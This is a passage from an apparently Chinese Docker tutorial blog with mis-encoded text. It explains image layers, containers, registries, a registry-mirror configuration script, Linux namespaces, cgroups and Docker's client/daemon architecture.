·å°±éšè—äº†å¤šå±‚çš„å­˜åœ¨ï¼Œåœ¨ç”¨æˆ·çš„è§’åº¦çœ‹æ¥ï¼Œåªå­˜åœ¨ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿã€‚æˆ‘ä»¬å¯ä»¥åœ¨å›¾ç‰‡çš„å³è¾¹çœ‹åˆ°è¿™ä¸ªè§†è§’çš„å½¢å¼ã€‚</p><p>ã€€ã€€Docker è®¾è®¡æ—¶ï¼Œå°±å……åˆ†åˆ©ç”¨ <strong>Union FS</strong>çš„æŠ€æœ¯ï¼Œå°†å…¶è®¾è®¡ä¸º <strong>åˆ†å±‚å­˜å‚¨çš„æ¶æ„</strong> ã€‚ é•œåƒå®é™…æ˜¯ç”±å¤šå±‚æ–‡ä»¶ç³»ç»Ÿè”åˆç»„æˆã€‚</p><p>ã€€ã€€<strong>é•œåƒæ„å»ºæ—¶ï¼Œä¼šä¸€å±‚å±‚æ„å»ºï¼Œå‰ä¸€å±‚æ˜¯åä¸€å±‚çš„åŸºç¡€ã€‚æ¯ä¸€å±‚æ„å»ºå®Œå°±ä¸ä¼šå†å‘ç”Ÿæ”¹å˜ï¼Œåä¸€å±‚ä¸Šçš„ä»»ä½•æ”¹å˜åªå‘ç”Ÿåœ¨è‡ªå·±è¿™ä¸€å±‚ã€‚</strong>ã€€æ¯”å¦‚ï¼Œåˆ é™¤å‰ä¸€å±‚æ–‡ä»¶çš„æ“ä½œï¼Œå®é™…ä¸æ˜¯çœŸçš„åˆ é™¤å‰ä¸€å±‚çš„æ–‡ä»¶ï¼Œè€Œæ˜¯ä»…åœ¨å½“å‰å±‚æ ‡è®°ä¸ºè¯¥æ–‡ä»¶å·²åˆ é™¤ã€‚åœ¨æœ€ç»ˆå®¹å™¨è¿è¡Œçš„æ—¶å€™ï¼Œè™½ç„¶ä¸ä¼šçœ‹åˆ°è¿™ä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯å®é™…ä¸Šè¯¥æ–‡ä»¶ä¼šä¸€ç›´è·Ÿéšé•œåƒã€‚å› æ­¤ï¼Œåœ¨æ„å»ºé•œåƒçš„æ—¶å€™ï¼Œéœ€è¦é¢å¤–å°å¿ƒï¼Œæ¯ä¸€å±‚å°½é‡åªåŒ…å«è¯¥å±‚éœ€è¦æ·»åŠ çš„ä¸œè¥¿ï¼Œä»»ä½•é¢å¤–çš„ä¸œè¥¿åº”è¯¥åœ¨è¯¥å±‚æ„å»ºç»“æŸå‰æ¸…ç†æ‰ã€‚</p><p>ã€€ã€€åˆ†å±‚å­˜å‚¨çš„ç‰¹å¾è¿˜ä½¿å¾—é•œåƒçš„å¤ç”¨ã€å®šåˆ¶å˜çš„æ›´ä¸ºå®¹æ˜“ã€‚ç”šè‡³å¯ä»¥ç”¨ä¹‹å‰æ„å»ºå¥½çš„é•œåƒä½œä¸ºåŸºç¡€å±‚ï¼Œç„¶åè¿›ä¸€æ­¥æ·»åŠ æ–°çš„å±‚ï¼Œä»¥å®šåˆ¶è‡ªå·±æ‰€éœ€çš„å†…å®¹ï¼Œæ„å»ºæ–°çš„é•œåƒã€‚</p><h3 id="å®¹å™¨-Container-é•œåƒè¿è¡Œæ—¶çš„å®ä½“"><a href="#å®¹å™¨-Container-é•œåƒè¿è¡Œæ—¶çš„å®ä½“" class="headerlink" title="å®¹å™¨(Container):é•œåƒè¿è¡Œæ—¶çš„å®ä½“"></a>å®¹å™¨(Container):é•œåƒè¿è¡Œæ—¶çš„å®ä½“</h3><p>ã€€ã€€é•œåƒï¼ˆImageï¼‰å’Œå®¹å™¨ï¼ˆContainerï¼‰çš„å…³ç³»ï¼Œå°±åƒæ˜¯é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡ä¸­çš„ ç±» å’Œ å®ä¾‹ ä¸€æ ·ï¼Œé•œåƒæ˜¯é™æ€çš„å®šä¹‰ï¼Œ<strong>å®¹å™¨æ˜¯é•œåƒè¿è¡Œæ—¶çš„å®ä½“ã€‚å®¹å™¨å¯ä»¥è¢«åˆ›å»ºã€å¯åŠ¨ã€åœæ­¢ã€åˆ é™¤ã€æš‚åœç­‰</strong> ã€‚</p><p>ã€€ã€€<strong>å®¹å™¨çš„å®è´¨æ˜¯è¿›ç¨‹ï¼Œä½†ä¸ç›´æ¥åœ¨å®¿ä¸»æ‰§è¡Œçš„è¿›ç¨‹ä¸åŒï¼Œå®¹å™¨è¿›ç¨‹è¿è¡Œäºå±äºè‡ªå·±çš„ç‹¬ç«‹çš„ å‘½åç©ºé—´ã€‚å‰é¢è®²è¿‡é•œåƒä½¿ç”¨çš„æ˜¯åˆ†å±‚å­˜å‚¨ï¼Œå®¹å™¨ä¹Ÿæ˜¯å¦‚æ­¤ã€‚</strong></p><p>ã€€ã€€<strong>å®¹å™¨å­˜å‚¨å±‚çš„ç”Ÿå­˜å‘¨æœŸå’Œå®¹å™¨ä¸€æ ·ï¼Œå®¹å™¨æ¶ˆäº¡æ—¶ï¼Œå®¹å™¨å­˜å‚¨å±‚ä¹Ÿéšä¹‹æ¶ˆäº¡ã€‚å› æ­¤ï¼Œä»»ä½•ä¿å­˜äºå®¹å™¨å­˜å‚¨å±‚çš„ä¿¡æ¯éƒ½ä¼šéšå®¹å™¨åˆ é™¤è€Œä¸¢å¤±ã€‚</strong></p><p>ã€€ã€€æŒ‰ç…§ Docker æœ€ä½³å®è·µçš„è¦æ±‚ï¼Œ<strong>å®¹å™¨ä¸åº”è¯¥å‘å…¶å­˜å‚¨å±‚å†…å†™å…¥ä»»ä½•æ•°æ®</strong> ï¼Œå®¹å™¨å­˜å‚¨å±‚è¦ä¿æŒæ— çŠ¶æ€åŒ–ã€‚<strong>æ‰€æœ‰çš„æ–‡ä»¶å†™å…¥æ“ä½œï¼Œéƒ½åº”è¯¥ä½¿ç”¨æ•°æ®å·ï¼ˆVolumeï¼‰ã€æˆ–è€…ç»‘å®šå®¿ä¸»ç›®å½•</strong>ï¼Œåœ¨è¿™äº›ä½ç½®çš„è¯»å†™ä¼šè·³è¿‡å®¹å™¨å­˜å‚¨å±‚ï¼Œç›´æ¥å¯¹å®¿ä¸»(æˆ–ç½‘ç»œå­˜å‚¨)å‘ç”Ÿè¯»å†™ï¼Œå…¶æ€§èƒ½å’Œç¨³å®šæ€§æ›´é«˜ã€‚æ•°æ®å·çš„ç”Ÿå­˜å‘¨æœŸç‹¬ç«‹äºå®¹å™¨ï¼Œå®¹å™¨æ¶ˆäº¡ï¼Œæ•°æ®å·ä¸ä¼šæ¶ˆäº¡ã€‚å› æ­¤ï¼Œ <strong>ä½¿ç”¨æ•°æ®å·åï¼Œå®¹å™¨å¯ä»¥éšæ„åˆ é™¤ã€é‡æ–° run ï¼Œæ•°æ®å´ä¸ä¼šä¸¢å¤±ã€‚</strong></p><h3 id="ä»“åº“-Repository-é›†ä¸­å­˜æ”¾é•œåƒæ–‡ä»¶çš„åœ°æ–¹"><a href="#ä»“åº“-Repository-é›†ä¸­å­˜æ”¾é•œåƒæ–‡ä»¶çš„åœ°æ–¹" class="headerlink" title="ä»“åº“(Repository):é›†ä¸­å­˜æ”¾é•œåƒæ–‡ä»¶çš„åœ°æ–¹"></a>ä»“åº“(Repository):é›†ä¸­å­˜æ”¾é•œåƒæ–‡ä»¶çš„åœ°æ–¹</h3><p>ã€€ã€€é•œåƒæ„å»ºå®Œæˆåï¼Œå¯ä»¥å¾ˆå®¹æ˜“çš„åœ¨å½“å‰å®¿ä¸»ä¸Šè¿è¡Œï¼Œä½†æ˜¯ï¼Œ <strong>å¦‚æœéœ€è¦åœ¨å…¶å®ƒæœåŠ¡å™¨ä¸Šä½¿ç”¨è¿™ä¸ªé•œåƒï¼Œæˆ‘ä»¬å°±éœ€è¦ä¸€ä¸ªé›†ä¸­çš„å­˜å‚¨ã€åˆ†å‘é•œåƒçš„æœåŠ¡ï¼ŒDocker Registryå°±æ˜¯è¿™æ ·çš„æœåŠ¡ã€‚</strong></p><p>ã€€ã€€ä¸€ä¸ª Docker Registryä¸­å¯ä»¥åŒ…å«å¤šä¸ªä»“åº“ï¼ˆRepositoryï¼‰ï¼›æ¯ä¸ªä»“åº“å¯ä»¥åŒ…å«å¤šä¸ªæ ‡ç­¾ï¼ˆTagï¼‰ï¼›æ¯ä¸ªæ ‡ç­¾å¯¹åº”ä¸€ä¸ªé•œåƒã€‚æ‰€ä»¥è¯´ï¼š<strong>é•œåƒä»“åº“æ˜¯Dockerç”¨æ¥é›†ä¸­å­˜æ”¾é•œåƒæ–‡ä»¶çš„åœ°æ–¹ç±»ä¼¼äºæˆ‘ä»¬ä¹‹å‰å¸¸ç”¨çš„ä»£ç ä»“åº“ã€‚</strong></p><p>ã€€ã€€é€šå¸¸ï¼Œ<strong>ä¸€ä¸ªä»“åº“ä¼šåŒ…å«åŒä¸€ä¸ªè½¯ä»¶ä¸åŒç‰ˆæœ¬çš„é•œåƒ</strong>ï¼Œè€Œ<strong>æ ‡ç­¾å°±å¸¸ç”¨äºå¯¹åº”è¯¥è½¯ä»¶çš„å„ä¸ªç‰ˆæœ¬</strong> ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>&lt;ä»“åº“å&gt;:&lt;æ ‡ç­¾&gt;</code>çš„æ ¼å¼æ¥æŒ‡å®šå…·ä½“æ˜¯è¿™ä¸ªè½¯ä»¶å“ªä¸ªç‰ˆæœ¬çš„é•œåƒã€‚å¦‚æœä¸ç»™å‡ºæ ‡ç­¾ï¼Œå°†ä»¥ latest ä½œä¸ºé»˜è®¤æ ‡ç­¾.ã€‚</p><p><strong>è¿™é‡Œè¡¥å……ä¸€ä¸‹Docker Registry å…¬å¼€æœåŠ¡å’Œç§æœ‰ Docker Registryçš„æ¦‚å¿µï¼š</strong></p><p>ã€€ã€€<strong>Docker Registry å…¬å¼€æœåŠ¡</strong> æ˜¯å¼€æ”¾ç»™ç”¨æˆ·ä½¿ç”¨ã€å…è®¸ç”¨æˆ·ç®¡ç†é•œåƒçš„ Registry æœåŠ¡ã€‚ä¸€èˆ¬è¿™ç±»å…¬å¼€æœåŠ¡å…è®¸ç”¨æˆ·å…è´¹ä¸Šä¼ ã€ä¸‹è½½å…¬å¼€çš„é•œåƒï¼Œå¹¶å¯èƒ½æä¾›æ”¶è´¹æœåŠ¡ä¾›ç”¨æˆ·ç®¡ç†ç§æœ‰é•œåƒã€‚</p><p>ã€€ã€€æœ€å¸¸ä½¿ç”¨çš„ Registry å…¬å¼€æœåŠ¡æ˜¯å®˜æ–¹çš„ <strong>Docker Hub</strong> ï¼Œè¿™ä¹Ÿæ˜¯é»˜è®¤çš„ Registryï¼Œå¹¶æ‹¥æœ‰å¤§é‡çš„é«˜è´¨é‡çš„å®˜æ–¹é•œåƒï¼Œç½‘å€ä¸ºï¼š<a href="https://hub.docker.com/" target="_blank" rel="noopener">https://hub.docker.com/</a> ã€‚åœ¨å›½å†…è®¿é—®<strong>Docker Hub</strong> å¯èƒ½ä¼šæ¯”è¾ƒæ…¢å›½å†…ä¹Ÿæœ‰ä¸€äº›äº‘æœåŠ¡å•†æä¾›ç±»ä¼¼äº Docker Hub çš„å…¬å¼€æœåŠ¡ã€‚æ¯”å¦‚ <a href="https://hub.tenxcloud.com/" target="_blank" rel="noopener">æ—¶é€Ÿäº‘é•œåƒåº“</a>ã€<a href="https://www.163yun.com/product/repo" target="_blank" rel="noopener">ç½‘æ˜“äº‘é•œåƒæœåŠ¡</a>ã€<a href="https://www.daocloud.io/" target="_blank" rel="noopener">DaoCloud é•œåƒå¸‚åœº</a>ã€<a href="https://www.aliyun.com/product/containerservice?utm_content=se_1292836" target="_blank" rel="noopener">é˜¿é‡Œäº‘é•œåƒåº“</a>ç­‰ã€‚<br><strong>ä¾‹å¦‚ï¼š</strong><br>é…ç½®é˜¿é‡Œäº‘é•œåƒåŠ é€Ÿå™¨</p><p>é’ˆå¯¹Dockerå®¢æˆ·ç«¯ç‰ˆæœ¬å¤§äº 1.10.0 çš„ç”¨æˆ·</p><p>æ‚¨å¯ä»¥é€šè¿‡ä¿®æ”¹daemoné…ç½®æ–‡ä»¶/etc/docker/daemon.jsonæ¥ä½¿ç”¨åŠ é€Ÿå™¨</p><p>ä¹Ÿå°±æ˜¯æ‰§è¡Œä¸‹é¢çš„shellè„šæœ¬å³å¯</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -<span class="selector-tag">p</span> /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon<span class="selector-class">.json</span> &lt;&lt;-<span class="string">'EOF'</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"registry-mirrors"</span>: [<span class="string">"https://xxxxxxx.mirror.aliyuncs.com"</span>]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure><p>ã€€ã€€é™¤äº†ä½¿ç”¨å…¬å¼€æœåŠ¡å¤–ï¼Œç”¨æˆ·è¿˜å¯ä»¥åœ¨ <strong>æœ¬åœ°æ­å»ºç§æœ‰ Docker Registry</strong> ã€‚Docker å®˜æ–¹æä¾›äº† Docker Registry é•œåƒï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨åšä¸ºç§æœ‰ Registry æœåŠ¡ã€‚å¼€æºçš„ Docker Registry é•œåƒåªæä¾›äº† Docker Registry API çš„æœåŠ¡ç«¯å®ç°ï¼Œè¶³ä»¥æ”¯æŒ docker å‘½ä»¤ï¼Œä¸å½±å“ä½¿ç”¨ã€‚ä½†ä¸åŒ…å«å›¾å½¢ç•Œé¢ï¼Œä»¥åŠé•œåƒç»´æŠ¤ã€ç”¨æˆ·ç®¡ç†ã€è®¿é—®æ§åˆ¶ç­‰é«˜çº§åŠŸèƒ½ã€‚</p><h3 id="å‘½åç©ºé—´-Namespaces"><a href="#å‘½åç©ºé—´-Namespaces" class="headerlink" title="å‘½åç©ºé—´(Namespaces)"></a>å‘½åç©ºé—´(Namespaces)</h3><p><strong>pid namespace</strong></p><p>ä¸åŒç”¨æˆ·çš„è¿›ç¨‹å°±æ˜¯é€šè¿‡ pid namespace éš”ç¦»å¼€çš„ï¼Œä¸”ä¸åŒ namespace ä¸­å¯ä»¥æœ‰ç›¸åŒ PIDã€‚å…·æœ‰ä»¥ä¸‹ç‰¹å¾:</p><ul><li>æ¯ä¸ª namespace ä¸­çš„ pid æ˜¯æœ‰è‡ªå·±çš„ pid=1 çš„è¿›ç¨‹(ç±»ä¼¼ /sbin/init è¿›ç¨‹)</li><li>æ¯ä¸ª namespace ä¸­çš„è¿›ç¨‹åªèƒ½å½±å“è‡ªå·±çš„åŒä¸€ä¸ª namespace æˆ–å­ namespace ä¸­çš„è¿›ç¨‹</li><li>å› ä¸º /proc åŒ…å«æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ï¼Œå› æ­¤åœ¨ container ä¸­çš„ pseudo-filesystem çš„ /proc ç›®å½•åªèƒ½çœ‹åˆ°è‡ªå·± namespace ä¸­çš„è¿›ç¨‹</li><li>å› ä¸º namespace å…è®¸åµŒå¥—ï¼Œçˆ¶ namespace å¯ä»¥å½±å“å­ namespace çš„è¿›ç¨‹ï¼Œæ‰€ä»¥å­ namespace çš„è¿›ç¨‹å¯ä»¥åœ¨çˆ¶ namespace ä¸­çœ‹åˆ°ï¼Œä½†æ˜¯å…·æœ‰ä¸åŒçš„ pid<br>å‚è€ƒæ–‡æ¡£ï¼š<a href="https://blog.jtlebi.fr/2014/01/05/introduction-to-linux-namespaces-part-3-pid/" target="_blank" rel="noopener">Introduction to Linux namespaces â€“ Part 3: PID</a></li></ul><p><strong>mnt namespace</strong></p><p>ç±»ä¼¼ chrootï¼Œå°†ä¸€ä¸ªè¿›ç¨‹æ”¾åˆ°ä¸€ä¸ªç‰¹å®šçš„ç›®å½•æ‰§è¡Œã€‚mnt namespace å…è®¸ä¸åŒ namespace çš„è¿›ç¨‹çœ‹åˆ°çš„æ–‡ä»¶ç»“æ„ä¸åŒï¼Œè¿™æ ·æ¯ä¸ª namespace ä¸­çš„è¿›ç¨‹æ‰€çœ‹åˆ°çš„æ–‡ä»¶ç›®å½•å°±è¢«éš”ç¦»å¼€äº†ã€‚åŒ chroot ä¸åŒï¼Œæ¯ä¸ª namespace ä¸­çš„ container åœ¨ /proc/mounts çš„ä¿¡æ¯åªåŒ…å«æ‰€åœ¨ namespace çš„ mount pointã€‚</p><p><strong>net namespace</strong></p><p>ç½‘ç»œéš”ç¦»æ˜¯é€šè¿‡ net namespace å®ç°çš„ï¼Œ æ¯ä¸ª net namespace æœ‰ç‹¬ç«‹çš„ network devices, IP addresses, IP routing tables, /proc/net ç›®å½•ã€‚è¿™æ ·æ¯ä¸ª container çš„ç½‘ç»œå°±èƒ½éš”ç¦»å¼€æ¥ã€‚ docker é»˜è®¤é‡‡ç”¨ veth çš„æ–¹å¼å°† container ä¸­çš„è™šæ‹Ÿç½‘å¡åŒ host ä¸Šçš„ä¸€ä¸ª docker bridge è¿æ¥åœ¨ä¸€èµ·ã€‚</p><p>å‚è€ƒæ–‡æ¡£ï¼š<a href="https://blog.jtlebi.fr/2014/01/19/introduction-to-linux-namespaces-part-5-net/" target="_blank" rel="noopener">Introduction to Linux namespaces â€“ Part 5: NET</a></p><p><strong>uts namespace</strong></p><p>UTS (â€œUNIX Time-sharing Systemâ€) namespace å…è®¸æ¯ä¸ª container æ‹¥æœ‰ç‹¬ç«‹çš„ hostname å’Œ domain name, ä½¿å…¶åœ¨ç½‘ç»œä¸Šå¯ä»¥è¢«è§†ä½œä¸€ä¸ªç‹¬ç«‹çš„èŠ‚ç‚¹è€Œé Host ä¸Šçš„ä¸€ä¸ªè¿›ç¨‹ã€‚</p><p>å‚è€ƒæ–‡æ¡£ï¼š<a href="https://blog.jtlebi.fr/2013/12/22/introduction-to-linux-namespaces-part-1-uts/" target="_blank" rel="noopener">Introduction to Linux namespaces â€“ Part 1: UTS</a></p><p><strong>ipc namespace</strong></p><p>container ä¸­è¿›ç¨‹äº¤äº’è¿˜æ˜¯é‡‡ç”¨ Linux å¸¸è§çš„è¿›ç¨‹é—´äº¤äº’æ–¹æ³• (interprocess communication - IPC), åŒ…æ‹¬å¸¸è§çš„ä¿¡å·é‡ã€æ¶ˆæ¯é˜Ÿåˆ—å’Œå…±äº«å†…å­˜ã€‚ç„¶è€ŒåŒ VM ä¸åŒï¼Œcontainer çš„è¿›ç¨‹é—´äº¤äº’å®é™…ä¸Šè¿˜æ˜¯ host ä¸Šå…·æœ‰ç›¸åŒ pid namespace ä¸­çš„è¿›ç¨‹é—´äº¤äº’ï¼Œå› æ­¤éœ€è¦åœ¨IPCèµ„æºç”³è¯·æ—¶åŠ å…¥ namespace ä¿¡æ¯ - æ¯ä¸ª IPC èµ„æºæœ‰ä¸€ä¸ªå”¯ä¸€çš„ 32bit IDã€‚</p><p>å‚è€ƒæ–‡æ¡£ï¼š<a href="https://blog.jtlebi.fr/2013/12/28/introduction-to-linux-namespaces-part-2-ipc/" target="_blank" rel="noopener">Introduction to Linux namespaces â€“ Part 2: IPC</a></p><p><strong>user namespace</strong></p><p>æ¯ä¸ª container å¯ä»¥æœ‰ä¸åŒçš„ user å’Œ group id, ä¹Ÿå°±æ˜¯è¯´å¯ä»¥ä»¥ container å†…éƒ¨çš„ç”¨æˆ·åœ¨ container å†…éƒ¨æ‰§è¡Œç¨‹åºè€Œé Host ä¸Šçš„ç”¨æˆ·ã€‚</p><p>æœ‰äº†ä»¥ä¸Š 6 ç§ namespace ä»è¿›ç¨‹ã€ç½‘ç»œã€IPCã€æ–‡ä»¶ç³»ç»Ÿã€UTS å’Œç”¨æˆ·è§’åº¦çš„éš”ç¦»ï¼Œä¸€ä¸ª container å°±å¯ä»¥å¯¹å¤–å±•ç°å‡ºä¸€ä¸ªç‹¬ç«‹è®¡ç®—æœºçš„èƒ½åŠ›ï¼Œå¹¶ä¸”ä¸åŒ container ä» OS å±‚é¢å®ç°äº†éš”ç¦»ã€‚ ç„¶è€Œä¸åŒ namespace ä¹‹é—´èµ„æºè¿˜æ˜¯ç›¸äº’ç«äº‰çš„ï¼Œä»ç„¶éœ€è¦ç±»ä¼¼ ulimit æ¥ç®¡ç†æ¯ä¸ª container æ‰€èƒ½ä½¿ç”¨çš„èµ„æº - cgroupã€‚</p><p><strong>Reference</strong></p><ul><li><a href="http://tiewei.github.io/cloud/Docker-Getting-Start/" target="_blank" rel="noopener">Docker Getting Start: Related Knowledge</a></li><li><a href="https://ruby-china.org/topics/22004" target="_blank" rel="noopener">Docker ä»‹ç»ä»¥åŠå…¶ç›¸å…³æœ¯è¯­ã€åº•å±‚åŸç†å’ŒæŠ€æœ¯</a></li></ul><h3 id="èµ„æºé…é¢-cgroups"><a href="#èµ„æºé…é¢-cgroups" class="headerlink" title="èµ„æºé…é¢(cgroups)"></a>èµ„æºé…é¢(cgroups)</h3><p><strong>cgroups</strong> å®ç°äº†å¯¹èµ„æºçš„é…é¢å’Œåº¦é‡ã€‚ cgroups çš„ä½¿ç”¨éå¸¸ç®€å•ï¼Œæä¾›ç±»ä¼¼æ–‡ä»¶çš„æ¥å£ï¼Œåœ¨ /cgroup ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹å³å¯æ–°å»ºä¸€ä¸ª groupï¼Œåœ¨æ­¤æ–‡ä»¶å¤¹ä¸­æ–°å»º task æ–‡ä»¶ï¼Œå¹¶å°† pid å†™å…¥è¯¥æ–‡ä»¶ï¼Œå³å¯å®ç°å¯¹è¯¥è¿›ç¨‹çš„èµ„æºæ§åˆ¶ã€‚å…·ä½“çš„èµ„æºé…ç½®é€‰é¡¹å¯ä»¥åœ¨è¯¥æ–‡ä»¶å¤¹ä¸­æ–°å»ºå­ subsystem ï¼Œ{å­ç³»ç»Ÿå‰ç¼€}.{èµ„æºé¡¹} æ˜¯å…¸å‹çš„é…ç½®æ–¹æ³•ï¼Œ å¦‚ memory.usageinbytes å°±å®šä¹‰äº†è¯¥ group åœ¨ subsystem memory ä¸­çš„ä¸€ä¸ªå†…å­˜é™åˆ¶é€‰é¡¹ã€‚ å¦å¤–ï¼Œcgroups ä¸­çš„ subsystem å¯ä»¥éšæ„ç»„åˆï¼Œä¸€ä¸ª subsystem å¯ä»¥åœ¨ä¸åŒçš„ group ä¸­ï¼Œä¹Ÿå¯ä»¥ä¸€ä¸ª group åŒ…å«å¤šä¸ª subsystem - ä¹Ÿå°±æ˜¯è¯´ä¸€ä¸ª subsystemã€‚</p><ul><li>memory<ul><li>å†…å­˜ç›¸å…³çš„é™åˆ¶</li></ul></li><li>cpu<ul><li>åœ¨ cgroup ä¸­ï¼Œå¹¶ä¸èƒ½åƒç¡¬ä»¶è™šæ‹ŸåŒ–æ–¹æ¡ˆä¸€æ ·èƒ½å¤Ÿå®šä¹‰ CPU èƒ½åŠ›ï¼Œä½†æ˜¯èƒ½å¤Ÿå®šä¹‰ CPU è½®è½¬çš„ä¼˜å…ˆçº§ï¼Œå› æ­¤å…·æœ‰è¾ƒé«˜ CPU ä¼˜å…ˆçº§çš„è¿›ç¨‹ä¼šæ›´å¯èƒ½å¾—åˆ° CPU è¿ç®—ã€‚ é€šè¿‡å°†å‚æ•°å†™å…¥ cpu.shares ,å³å¯å®šä¹‰æ”¹ cgroup çš„ CPU ä¼˜å…ˆçº§ - è¿™é‡Œæ˜¯ä¸€ä¸ªç›¸å¯¹æƒé‡ï¼Œè€Œéç»å¯¹å€¼</li></ul></li><li>blkio<ul><li>block IO ç›¸å…³çš„ç»Ÿè®¡å’Œé™åˆ¶ï¼Œbyte/operation ç»Ÿè®¡å’Œé™åˆ¶ (IOPS ç­‰)ï¼Œè¯»å†™é€Ÿåº¦é™åˆ¶ç­‰ï¼Œä½†æ˜¯è¿™é‡Œä¸»è¦ç»Ÿè®¡çš„éƒ½æ˜¯åŒæ­¥ IO</li></ul></li><li>devices<ul><li>è®¾å¤‡æƒé™é™åˆ¶</li></ul></li></ul><p>å‚è€ƒæ–‡æ¡£ï¼š<a href="http://tiewei.github.io/devops/howto-use-cgroup/" target="_blank" rel="noopener">how to use cgroup</a></p><h2 id="Dockeræ¶æ„"><a href="#Dockeræ¶æ„" class="headerlink" title="Dockeræ¶æ„"></a>Dockeræ¶æ„</h2><p>  <img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566323508565.png" alt></p><p>ã€€ è¿™å¼ å›¾å±•ç¤ºäº† Docker å®¢æˆ·ç«¯ã€æœåŠ¡ç«¯å’Œ Docker ä»“åº“ï¼ˆå³ Docker Hub å’Œ Docker Cloud ï¼‰ï¼Œé»˜è®¤æƒ…å†µä¸‹Docker ä¼šåœ¨ Docker ä¸­å¤®ä»“åº“å¯»æ‰¾é•œåƒæ–‡ä»¶ï¼Œè¿™ç§åˆ©ç”¨ä»“åº“ç®¡ç†é•œåƒçš„è®¾è®¡ç†å¿µç±»ä¼¼äº Git ï¼Œå½“ç„¶è¿™ä¸ªä»“åº“æ˜¯å¯ä»¥é€šè¿‡ä¿®æ”¹é…ç½®æ¥æŒ‡å®šçš„ï¼Œç”šè‡³æˆ‘ä»¬å¯ä»¥åˆ›å»ºæˆ‘ä»¬è‡ªå·±çš„ç§æœ‰ä»“åº“ã€‚</p><p>  <code>Docker</code> çš„æ ¸å¿ƒç»„ä»¶åŒ…æ‹¬ï¼š</p><ol><li>Docker Client</li><li>Docker daemon</li><li>Docker Image</li><li>Docker Registry</li><li>Docker Container</li></ol><p>Docker é‡‡ç”¨çš„æ˜¯ Client/Server æ¶æ„ã€‚å®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼ŒæœåŠ¡å™¨è´Ÿè´£æ„å»ºã€è¿è¡Œå’Œåˆ†å‘å®¹å™¨ã€‚å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨å¯ä»¥è¿è¡Œåœ¨åŒä¸€ä¸ª Host ä¸Šï¼Œå®¢æˆ·ç«¯ä¹Ÿå¯ä»¥é€šè¿‡ socket æˆ– REST API ä¸è¿œç¨‹çš„æœåŠ¡å™¨é€šä¿¡ã€‚</p><h3 id="Docker-Client"><a href="#Docker-Client" class="headerlink" title="Docker Client"></a>Docker Client</h3><p>Docker Client ï¼Œä¹Ÿç§° Docker å®¢æˆ·ç«¯ã€‚å®ƒå…¶å®å°±æ˜¯ Docker æä¾›å‘½ä»¤è¡Œç•Œé¢ (CLI) å·¥å…·ï¼Œæ˜¯è®¸å¤š Docker ç”¨æˆ·ä¸ Docker è¿›è¡Œäº¤äº’çš„ä¸»è¦æ–¹å¼ã€‚å®¢æˆ·ç«¯å¯ä»¥æ„å»ºï¼Œè¿è¡Œå’Œåœæ­¢åº”ç”¨ç¨‹åºï¼Œè¿˜å¯ä»¥è¿œç¨‹ä¸Docker_Hostè¿›è¡Œäº¤äº’ã€‚æœ€å¸¸ç”¨çš„ Docker å®¢æˆ·ç«¯å°±æ˜¯ docker å‘½ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ docker å‘½ä»¤å¾ˆæ–¹ä¾¿åœ°åœ¨ host ä¸Šæ„å»ºå’Œè¿è¡Œ docker å®¹å™¨ã€‚</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566367742090.png" alt></p><h3 id="Docker-daemon"><a href="#Docker-daemon" class="headerlink" title="Docker daemon"></a>Docker daemon</h3><p>Docker daemon æ˜¯æœåŠ¡å™¨ç»„ä»¶ï¼Œä»¥ Linux åå°æœåŠ¡çš„æ–¹å¼è¿è¡Œï¼Œæ˜¯ Docker æœ€æ ¸å¿ƒçš„åå°è¿›ç¨‹ï¼Œæˆ‘ä»¬ä¹ŸæŠŠå®ƒç§°ä¸ºå®ˆæŠ¤è¿›ç¨‹ã€‚å®ƒè´Ÿè´£å“åº”æ¥è‡ª Docker Client çš„è¯·æ±‚ï¼Œç„¶åå°†è¿™äº›è¯·æ±‚ç¿»è¯‘æˆç³»ç»Ÿè°ƒç”¨å®Œæˆå®¹å™¨ç®¡ç†æ“ä½œã€‚è¯¥è¿›ç¨‹ä¼šåœ¨åå°å¯åŠ¨ä¸€ä¸ª API Server ï¼Œè´Ÿè´£æ¥æ”¶ç”± Docker Client å‘é€çš„è¯·æ±‚ï¼Œæ¥æ”¶åˆ°çš„è¯·æ±‚å°†é€šè¿‡Docker daemon å†…éƒ¨çš„ä¸€ä¸ªè·¯ç”±åˆ†å‘è°ƒåº¦ï¼Œç”±å…·ä½“çš„å‡½æ•°æ¥æ‰§è¡Œè¯·æ±‚ã€‚</p><p>æˆ‘ä»¬å¤§è‡´å¯ä»¥å°†å…¶åˆ†ä¸ºä»¥ä¸‹ä¸‰éƒ¨åˆ†ï¼š</p><ul><li>Docker Server</li><li>Engine</li><li>Job<br>Docker Daemonçš„æ¶æ„å¦‚ä¸‹æ‰€ç¤ºï¼š</li></ul><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566367906404.png" alt></p><p>Docker Daemon å¯ä»¥è®¤ä¸ºæ˜¯é€šè¿‡ Docker Server æ¨¡å—æ¥å— Docker Client çš„è¯·æ±‚ï¼Œå¹¶åœ¨ Engine ä¸­å¤„ç†è¯·æ±‚ï¼Œç„¶åæ ¹æ®è¯·æ±‚ç±»å‹ï¼Œåˆ›å»ºå‡ºæŒ‡å®šçš„ Job å¹¶è¿è¡Œã€‚ </p><p>Docker Daemon è¿è¡Œåœ¨ Docker host 